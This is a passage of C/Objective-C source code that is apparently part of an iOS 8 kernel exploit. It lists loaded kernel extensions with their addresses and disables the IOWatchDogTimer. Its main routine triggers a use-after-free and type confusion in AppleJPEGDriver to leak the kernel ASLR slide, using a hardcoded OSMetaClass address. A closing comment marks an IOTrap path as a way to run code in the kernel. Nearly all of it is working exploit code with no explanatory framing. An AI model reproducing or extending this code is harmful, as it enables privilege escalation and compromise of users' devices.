            char *name = cstring(CFDictionaryGetValue(values[j], CFSTR("CFBundleIdentifier")));

            CFNumberGetValue(CFDictionaryGetValue(values[j], CFSTR("OSBundleLoadTag")),
                             kCFNumberSInt32Type,
                             &kextTag);
            if (kextTag != i) {
                continue;
            }

            CFNumberGetValue(CFDictionaryGetValue(values[j], CFSTR("OSBundleRetainCount")),
                             kCFNumberSInt32Type,
                             &refs);
            // xxx useful
            CFNumberGetValue(CFDictionaryGetValue(values[j], CFSTR("OSBundleLoadAddress")),
                             kCFNumberSInt64Type,
                             &address);
            CFNumberGetValue(CFDictionaryGetValue(values[j], CFSTR("OSBundleLoadSize")),
                             kCFNumberSInt64Type,
                             &size);
            CFNumberGetValue(CFDictionaryGetValue(values[j], CFSTR("OSBundleWiredSize")),
                             kCFNumberSInt64Type,
                             &wired);
            printf("%5d %4d 0x%-16llx 0x%-10llx 0x%-10llx %s (%s) ", kextTag, refs, address, size, wired, name, cstring(CFDictionaryGetValue(values[j], CFSTR("CFBundleVersion"))));

            CFArrayRef linkedAgainst = CFDictionaryGetValue(values[j], CFSTR("OSBundleDependencies"));


            if (linkedAgainst == NULL) {
                printf("\n");
                continue;
            }

            CFIndex linkedCount = CFArrayGetCount(linkedAgainst);
            int linked = 0;

            CFMutableArrayRef marray = CFArrayCreateMutableCopy(NULL, linkedCount, linkedAgainst);

            CFArraySortValues(marray, CFRangeMake(0, linkedCount), (CFComparatorFunction)CFNumberCompare, NULL);

            printf("<");
            int l;
            for (l = 0 ; l < linkedCount;l++) {
                CFNumberGetValue(CFArrayGetValueAtIndex(marray,l),
                                 kCFNumberSInt32Type,
                                 &linked);

                if (l) printf(" ");
                printf ("%d", linked);
            }
            printf(">\n");
        }
        ++i;
	}
}

/**
 * The Watchdog timer is designed to prevent the device from hanging during upgrades or restores.
 * Watchdog timers are included in Mac also, ensuring automatic reboot in system crash.
 */
void disable_watchdog () {
    CFMutableDictionaryRef matching;
    io_service_t service = 0;
    uint32_t zero = 0;
    CFNumberRef n;

    matching = IOServiceMatching("IOWatchDogTimer");
    service = IOServiceGetMatchingService(kIOMasterPortDefault, matching);
    n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &zero);

    IORegistryEntrySetCFProperties(service, n);
    IOObjectRelease(service);
}


#ifdef __LP64__
char* execution_environment_arch = "64-bit";
#else
char* execution_environment_arch = "32-bit";
#endif



/**
 * MAIN
 */
int main(int argc, char **argv) {
    disable_watchdog();

    printf("[D] Starting (exec_arch=%s) (proc_arch=%s) (endian=%s) sizeof(ull)=%d sizeof(uint64_t)=%d\n",
         execution_environment_arch, (processorIs64Bit()) ? "64-bit" : "32-bit",
         (BYTE_ORDER == LITTLE_ENDIAN) ? "little" : "big",
         sizeof(unsigned long long), sizeof(uint64_t));
    fflush(stdout);

    //printKextStuff();

    /******* THE BELOW STUFF WORKS GREAT FOR i5.ios8 **********/

    // OSMetaClass::getMetaClass() returns static variable -> i5.ios8 -> 0x803fbe84
    // i5 ios8 - AppleJPEGDriver and IOHIDEventService both work for getMeta() and release()
    // also IOHIDResource
    int OSMETACLASS_LOC = 0x803fbe84;


    // Get kASLR slide

    uint64_t ret1 = 0;
    UAFZoneFiller* zonetest = [[UAFZoneFiller alloc] init];
    [zonetest prepTypeConfusion: "AppleJPEGDriver"];
    ret1 = [zonetest uafCall: 0];

    unsigned int object_addr = [zonetest uafCall: 0];

    unsigned int kernel_slide = OSMETACLASS_LOC - [zonetest uafCall2: object_addr];
    printf("[*] kSLIDE - [0x%x]  OBJ_ADDR - [0x%x]\n", kernel_slide, object_addr); fflush(stdout);
    sleep(1);



    printf("\n[!] FINISHED.\n");
    quit(0); // sleeeeeeep forever... until we find a fix

    // Gotta prevent double free crash still!

    return 0;
}


/* Potential point of entry for putting executable code in kernel with IOTrap
https://conference.hitb.org/hitbsecconf2013kul/materials/D2T2%20-%20Stefan%20Esser%20-%20Tales%20from%20iOS%206%20Exploitation%20and%20iOS%207%20Security%20Changes.pdf
kern_return_t iokit_user_client_trap(struct iokit_user_client_trap_args *args) {
    kern_return_t result = kIOReturnBadArgument;
    IOUserClient *userClient;
    if ((userClient = OSDynamicCast(IOUserClient,
            iokit_lookup_connect_ref_current_task((OSObject *)(args->userClientRef))))) {
        IOExternalTrap *trap;
        IOService *target = NULL;
        trap = userClient->getTargetAndTrapForIndex(&target, args->index);
        if (trap && target) {
            IOTrap func;
            func = trap->func;
            if (func) {
                result = (target->*func)(args->p1, args->p2, args->p3, args->p4, args->p5, args->p6);
            }
        }
        userClient->release();
    }
    return result;
} // */
